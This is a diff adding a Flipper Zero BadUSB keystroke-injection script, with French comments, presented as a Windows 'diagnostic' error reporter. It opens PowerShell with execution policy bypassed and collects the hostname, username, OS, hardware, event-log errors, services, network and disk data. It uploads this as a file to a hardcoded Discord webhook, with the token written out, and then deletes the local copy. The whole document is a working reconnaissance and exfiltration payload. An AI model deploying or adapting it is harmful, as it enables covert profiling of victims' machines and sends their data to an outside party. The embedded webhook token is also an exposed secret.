@@ -1,0 +1,393 @@
+REM ================================================================
+REM Flipper Zero BadUSB - Rapporteur d'Erreurs via Discord
+REM ================================================================
+REM Nom: Error Reporter Discord
+REM Description: Diagnostic système et rapport d'erreurs via webhook
+REM Cible: Windows 7/8/10/11 (PowerShell 2.0+)
+REM Auteur: Plume-Paopedia
+REM Version: 1.0
+REM Durée: 2-5 minutes
+REM Privilèges: Utilisateur standard
+REM Fonctionnalités: Rapport système + erreurs + logs Windows
+REM ================================================================
+
+DEFAULT_DELAY 250
+
+REM Ouverture PowerShell discrète
+GUI r
+DELAY 400
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Normal
+ENTER
+DELAY 1000
+
+STRING try {
+ENTER
+
+STRING # Configuration webhook
+ENTER
+STRING $webhook = "https://discordapp.com/api/webhooks/1416477793264603249/dxrIG93WCYqELVdSEXtQ7aqioc3MglF1m06Kee476so3zrsRllBg"
+ENTER
+
+STRING # Fonction d'envoi Discord
+ENTER
+STRING function Send-Discord {
+ENTER
+STRING   param([string]$msg, [string]$file = $null)
+ENTER
+STRING   try {
+ENTER
+STRING     if ($file -and (Test-Path $file) -and (Get-Item $file).Length -lt 8MB) {
+ENTER
+STRING       $boundary = [Guid]::NewGuid()
+ENTER
+STRING       $headers = @{'Content-Type'="multipart/form-data; boundary=$boundary"}
+ENTER
+STRING       $fileBytes = [IO.File]::ReadAllBytes($file)
+ENTER
+STRING       $fileName = [IO.Path]::GetFileName($file)
+ENTER
+STRING       $body = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n$msg`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: text/plain`r`n`r`n"
+ENTER
+STRING       $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)
+ENTER
+STRING       $fullBody = $bodyBytes + $fileBytes + [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--")
+ENTER
+STRING       Invoke-RestMethod -Uri $webhook -Method Post -Body $fullBody -Headers $headers
+ENTER
+STRING     } else {
+ENTER
+STRING       $payload = @{content=$msg} | ConvertTo-Json
+ENTER
+STRING       Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
+ENTER
+STRING     }
+ENTER
+STRING   } catch { Write-Host "Webhook error: $_" }
+ENTER
+STRING }
+ENTER
+DELAY 300
+
+STRING # Début du diagnostic
+ENTER
+STRING Write-Host '🔍 Démarrage diagnostic système...' -ForegroundColor Green
+ENTER
+STRING Send-Discord "🔍 **Diagnostic système démarré** sur **$(hostname)** à $(Get-Date -Format 'HH:mm:ss')"
+ENTER
+DELAY 200
+
+STRING # Collecte des informations système
+ENTER
+STRING $sysInfo = @()
+ENTER
+STRING $sysInfo += "═══════════════════════════════════"
+ENTER
+STRING $sysInfo += "RAPPORT DE DIAGNOSTIC SYSTÈME"
+ENTER
+STRING $sysInfo += "═══════════════════════════════════"
+ENTER
+STRING $sysInfo += "Date: $(Get-Date)"
+ENTER
+STRING $sysInfo += "Machine: $(hostname)"
+ENTER
+STRING $sysInfo += "Utilisateur: $env:USERNAME"
+ENTER
+STRING $sysInfo += ""
+ENTER
+DELAY 200
+
+STRING # Informations système de base
+ENTER
+STRING try {
+ENTER
+STRING   $os = Get-CimInstance Win32_OperatingSystem
+ENTER
+STRING   $sysInfo += "OS: $($os.Caption) $($os.Version)"
+ENTER
+STRING   $sysInfo += "Architecture: $($os.OSArchitecture)"
+ENTER
+STRING   $sysInfo += "Dernière mise à jour: $($os.LastBootUpTime)"
+ENTER
+STRING } catch { $sysInfo += "Erreur OS: $($_.Exception.Message)" }
+ENTER
+DELAY 200
+
+STRING # Informations matériel
+ENTER
+STRING try {
+ENTER
+STRING   $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
+ENTER
+STRING   $ram = Get-CimInstance Win32_ComputerSystem
+ENTER
+STRING   $sysInfo += "CPU: $($cpu.Name)"
+ENTER
+STRING   $sysInfo += "RAM: $([math]::Round($ram.TotalPhysicalMemory/1GB,2)) GB"
+ENTER
+STRING } catch { $sysInfo += "Erreur matériel: $($_.Exception.Message)" }
+ENTER
+DELAY 200
+
+STRING # Version PowerShell
+ENTER
+STRING $sysInfo += "PowerShell: $($PSVersionTable.PSVersion)"
+ENTER
+STRING $sysInfo += "Politique d'exécution: $(Get-ExecutionPolicy)"
+ENTER
+STRING $sysInfo += ""
+ENTER
+
+STRING # Recherche d'erreurs dans les logs Windows
+ENTER
+STRING Write-Host '📋 Analyse des logs système...' -ForegroundColor Yellow
+ENTER
+STRING $errors = @()
+ENTER
+DELAY 200
+
+STRING # Logs système récents (dernières 24h)
+ENTER
+STRING try {
+ENTER
+STRING   $yesterday = (Get-Date).AddHours(-24)
+ENTER
+STRING   $systemErrors = Get-EventLog -LogName System -EntryType Error -After $yesterday -ErrorAction SilentlyContinue | Select-Object -First 10
+ENTER
+STRING   if ($systemErrors) {
+ENTER
+STRING     $sysInfo += "ERREURS SYSTÈME (24h):"
+ENTER
+STRING     foreach ($err in $systemErrors) {
+ENTER
+STRING       $sysInfo += "• $($err.TimeGenerated.ToString('HH:mm')) - $($err.Source): $($err.Message.Substring(0,[Math]::Min(100,$err.Message.Length)))"
+ENTER
+STRING     }
+ENTER
+STRING     $sysInfo += ""
+ENTER
+STRING   }
+ENTER
+STRING } catch { $sysInfo += "Impossible d'accéder aux logs système" }
+ENTER
+DELAY 300
+
+STRING # Logs application récents
+ENTER
+STRING try {
+ENTER
+STRING   $appErrors = Get-EventLog -LogName Application -EntryType Error -After $yesterday -ErrorAction SilentlyContinue | Select-Object -First 5
+ENTER
+STRING   if ($appErrors) {
+ENTER
+STRING     $sysInfo += "ERREURS APPLICATIONS (24h):"
+ENTER
+STRING     foreach ($err in $appErrors) {
+ENTER
+STRING       $sysInfo += "• $($err.TimeGenerated.ToString('HH:mm')) - $($err.Source): $($err.Message.Substring(0,[Math]::Min(100,$err.Message.Length)))"
+ENTER
+STRING     }
+ENTER
+STRING     $sysInfo += ""
+ENTER
+STRING   }
+ENTER
+STRING } catch { $sysInfo += "Impossible d'accéder aux logs applications" }
+ENTER
+DELAY 300
+
+STRING # Vérification services critiques
+ENTER
+STRING Write-Host '🔧 Vérification des services...' -ForegroundColor Yellow
+ENTER
+STRING $criticalServices = @('Spooler','BITS','Themes','AudioSrv','Dhcp','Dnscache')
+ENTER
+STRING $serviceErrors = @()
+ENTER
+STRING foreach ($service in $criticalServices) {
+ENTER
+STRING   try {
+ENTER
+STRING     $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
+ENTER
+STRING     if ($svc) {
+ENTER
+STRING       if ($svc.Status -ne 'Running') {
+ENTER
+STRING         $serviceErrors += "⚠️ Service $service`: $($svc.Status)"
+ENTER
+STRING       } else {
+ENTER
+STRING         $sysInfo += "✅ Service $service`: Running"
+ENTER
+STRING       }
+ENTER
+STRING     } else {
+ENTER
+STRING       $serviceErrors += "❌ Service $service`: Introuvable"
+ENTER
+STRING     }
+ENTER
+STRING   } catch {
+ENTER
+STRING     $serviceErrors += "❌ Service $service`: Erreur d'accès"
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 300
+
+STRING if ($serviceErrors.Count -gt 0) {
+ENTER
+STRING   $sysInfo += ""
+ENTER
+STRING   $sysInfo += "PROBLÈMES DE SERVICES:"
+ENTER
+STRING   foreach ($err in $serviceErrors) { $sysInfo += $err }
+ENTER
+STRING   $sysInfo += ""
+ENTER
+STRING }
+ENTER
+
+STRING # Test connectivité réseau
+ENTER
+STRING Write-Host '🌐 Test connectivité réseau...' -ForegroundColor Yellow
+ENTER
+STRING $networkTest = @()
+ENTER
+STRING $testHosts = @('8.8.8.8','google.com','github.com')
+ENTER
+STRING foreach ($host in $testHosts) {
+ENTER
+STRING   try {
+ENTER
+STRING     $result = Test-Connection -ComputerName $host -Count 1 -ErrorAction SilentlyContinue
+ENTER
+STRING     if ($result) {
+ENTER
+STRING       $networkTest += "✅ $host`: OK ($($result.ResponseTime)ms)"
+ENTER
+STRING     } else {
+ENTER
+STRING       $networkTest += "❌ $host`: Échec"
+ENTER
+STRING     }
+ENTER
+STRING   } catch {
+ENTER
+STRING     $networkTest += "❌ $host`: Erreur"
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+STRING $sysInfo += "TEST RÉSEAU:"
+ENTER
+STRING foreach ($test in $networkTest) { $sysInfo += $test }
+ENTER
+STRING $sysInfo += ""
+ENTER
+DELAY 300
+
+STRING # Informations sur l'espace disque
+ENTER
+STRING $disks = Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"
+ENTER
+STRING $sysInfo += "ESPACE DISQUE:"
+ENTER
+STRING foreach ($disk in $disks) {
+ENTER
+STRING   $freeGB = [math]::Round($disk.FreeSpace/1GB,2)
+ENTER
+STRING   $totalGB = [math]::Round($disk.Size/1GB,2)
+ENTER
+STRING   $pctFree = [math]::Round(($disk.FreeSpace/$disk.Size)*100,1)
+ENTER
+STRING   $status = if ($pctFree -lt 10) { "⚠️" } elseif ($pctFree -lt 20) { "🟡" } else { "✅" }
+ENTER
+STRING   $sysInfo += "$status Disque $($disk.DeviceID) $freeGB GB libre / $totalGB GB ($pctFree%)"
+ENTER
+STRING }
+ENTER
+STRING $sysInfo += ""
+ENTER
+DELAY 200
+
+STRING # Sauvegarde du rapport
+ENTER
+STRING $reportFile = "$env:TEMP\diagnostic_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+ENTER
+STRING $sysInfo | Out-File -FilePath $reportFile -Encoding UTF8
+ENTER
+
+STRING # Création résumé pour Discord
+ENTER
+STRING $summary = "📊 **Diagnostic de $(hostname) terminé**`n"
+ENTER
+STRING $summary += "🖥️ **OS:** $((Get-CimInstance Win32_OperatingSystem).Caption)`n"
+ENTER
+STRING $summary += "👤 **Utilisateur:** $env:USERNAME`n"
+ENTER
+STRING $summary += "⏰ **Heure:** $(Get-Date -Format 'HH:mm:ss')`n"
+ENTER
+STRING if ($serviceErrors.Count -gt 0) {
+ENTER
+STRING   $summary += "⚠️ **Services problématiques:** $($serviceErrors.Count)`n"
+ENTER
+STRING }
+ENTER
+STRING $errorCount = 0
+ENTER
+STRING try { $errorCount = (Get-EventLog -LogName System -EntryType Error -After (Get-Date).AddHours(-24) -ErrorAction SilentlyContinue | Measure-Object).Count } catch { }
+ENTER
+STRING if ($errorCount -gt 0) {
+ENTER
+STRING   $summary += "📋 **Erreurs système (24h):** $errorCount`n"
+ENTER
+STRING }
+ENTER
+STRING $summary += "📄 **Rapport détaillé ci-joint**"
+ENTER
+
+STRING # Envoi résumé + fichier
+ENTER
+STRING Write-Host '📤 Envoi du rapport via Discord...' -ForegroundColor Green
+ENTER
+STRING Send-Discord $summary $reportFile
+ENTER
+DELAY 300
+
+STRING # Nettoyage
+ENTER
+STRING Remove-Item $reportFile -Force -ErrorAction SilentlyContinue
+ENTER
+
+STRING Write-Host '✅ Diagnostic terminé et envoyé!' -ForegroundColor Green
+ENTER
+STRING Write-Host 'Vérifiez le canal Discord pour le rapport complet.' -ForegroundColor Cyan
+ENTER
+
+STRING } catch {
+ENTER
+STRING   $errMsg = "❌ **ERREUR DIAGNOSTIC:** $($_.Exception.Message) sur $(hostname)"
+ENTER
+STRING   try {
+ENTER
+STRING     $webhookUrl = "https://discordapp.com/api/webhooks/1416477793264603249/dxrIG93WCYqELVdSEXtQ7aqioc3MglF1m06Kee476so3zrsRllBg"
+ENTER
+STRING     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$errMsg}|ConvertTo-Json) -ContentType 'application/json'
+ENTER
+STRING   } catch { }
+ENTER
+STRING   Write-Host $errMsg -ForegroundColor Red
+ENTER
+STRING }
+ENTER
+
+STRING Write-Host "Appuyez sur Entrée pour fermer..."
+ENTER
+STRING Read-Host
+ENTER
+STRING exit
+ENTER
